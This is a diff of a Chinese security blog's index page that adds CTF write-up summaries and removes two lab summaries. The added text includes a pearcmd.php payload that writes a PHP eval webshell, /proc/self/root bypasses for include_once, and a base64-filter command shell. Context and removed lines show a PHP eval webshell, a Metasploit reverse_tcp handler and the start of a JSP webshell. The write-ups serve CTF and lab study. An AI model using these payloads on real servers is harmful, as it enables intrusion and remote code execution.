@@ -156,6 +156,38 @@ msfdb runuse exploit/multi/handler set payload linux/x64/meterpreter/reverse_tc
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">NSS#roun8 web专项赛</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MyPage Where is my page？
+拿到题目就是这个样子
+感觉就是文件包含
+可以读取，可以用filter协议
+但是index.php怎么尝试都没读取到,data和input等协议都被ban了
+方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
+index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
+方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
+?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
+index.php源码是
+&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
+至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
+/proc/self/root/多级连接绕过原理可参考此文
+require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
+&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.</div><div class="post-footer">
+        <a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Python pth文件写入getshell</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a>&nbsp;<a href="/categories/%E6%9D%82%E6%96%87%E8%AE%B0%E5%BD%95/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>杂文记录</a></span></div><div class="content">原理：Python pth文件写入getshell 参考https://www.cnblogs.com/Nestar/p/17336664.html
+python的site模块支持&quot;Site-specific configuration hook&quot;的功能，这个功能点本身是用来将特定路径加入模块搜索路径。该模块在初始化期间自动导入
+sys.prefix和sys.exec_prefix在D:/Python，那么创建路径为D:\Python\Lib\site-packages\1.pth的pth文件，然后其内容为
+D:/Python/temp/ 重新启动python
+1.path的路径被添加到sys.path中
+site.py的实现中，有这么一段
+def addpackage(sitedir, name, known_paths): if known_paths is None: known_paths = _init_pathinfo() reset = True else: reset = False fullname = os.path.join(sitedir, name) _trace(f&#34;Processing .pth file: {fullname!r}&#34;) try: # locale encoding is not ideal especially on Windows. But we have used # it for a long time. setuptools uses the locale encoding too. f = io.TextIOWrapper(io.open_code(fullname), encoding=&#34;locale&#34;) except OSError: return with f: for n, line in enumerate(f): if line.</div><div class="post-footer">
+        <a href="/posts/ctf/python-pth%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/python/">Python</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp/">三层靶机frp</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">https://blog.csdn.net/qq_61237064/article/details/125602997参考此文搭建环境
@@ -200,36 +232,6 @@ dirsearch扫描目录 可以看到不少phpmyadmin，找到后台 弱口令就�
 select &#34;&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;&#34; ; Yxcms后台登录getshell mysql后台看到有个newyxcms的数据库</div><div class="post-footer">
         <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">红日靶场2</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内网渗透</a></span></div><div class="content">红日靶场2 拓扑图 默认密码：1qaz@WSX
-0x01环境搭建 我是参考此视频
-https://www.bilibili.com/video/BV1De4y1a7Ps/?spm_id_from=333.337.search-card.all.click&vd_source=cf73ac8de9b7c0322b1bccf77de91c5dnat模式分配111段
-自定义一个10.10.10.x 的网络 我命名为VMnet5
-进入WEB中，来到C:\Oracle\Middleware\user_projects\domains\base_domain\bin 路径 以管理员权限执行startWebLogic
-0x02信息收集 端口扫描 这个命令显示更详细，可以看到不少的服务都打开了
-漏洞探测 80端口是空白，这边先重点关注一下7001 Oracle WebLogic Server
-跳转到404
-尝试使用WeblogicScan脚本探测漏洞：
-python3 WeblogicScan.py -u 192.168.111.80 -p 7001 有合适的cve
-github准备好exp工具进行利用
--u 检测 -f上传木马
-得到一个url 可以直接执行命令
-上帝视角去看靶机的shell.jsp的文件位置
-C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war
-传入马比较棘手且比赛也没有上帝视角，另寻其他方法
-getShell 找到个工具weblogic漏洞检测工具
-输入url就能扫漏洞，然后命令执行，最好用的是可以文件上传，这里传入一个蚁剑的jsp马
-&lt;%!class U extends ClassLoader {U(ClassLoader c) {super(c);}public Class g(byte[] b) {return super.defineClass(b, 0, b.length);}}public byte[] base64Decode(String str) throws Exception {try {Class clazz = Class.</div><div class="post-footer">
-        <a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA2/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/0xgame2022/">0xgame2022</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">do_u_like_pop &lt;?php highlight_file(__FILE__); class Apple{ public $var; public function __wakeup(){ $this-&gt;var-&gt;value; } public function __invoke(){ echo $this-&gt;var; } } class Banana{ public $source=&#34;pop.php&#34;; public $str; public function __toString(){ echo file_get_contents($this-&gt;source); return &#39;do u like pop?&#39;; } public function __construct(){ $this-&gt;source = &#34;flag in flag.php&#34;; echo 123; } } class Cherry{ public $p; public $o; public function __construct(){ $this-&gt;o = &#39;pop song&#39;; } public function __get($key){ ($this-&gt;p)(); } } if(isset($_GET[&#39;pop&#39;])){ @unserialize($_GET[&#39;pop&#39;]); } 简单的反序列化链子</div><div class="post-footer">
-        <a href="/posts/ctf/0xgame2022/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item active">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -246,7 +248,7 @@ getShell 找到个工具weblogic漏洞检测工具
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/7/">7</a>
+                        <a href="/page/8/">8</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
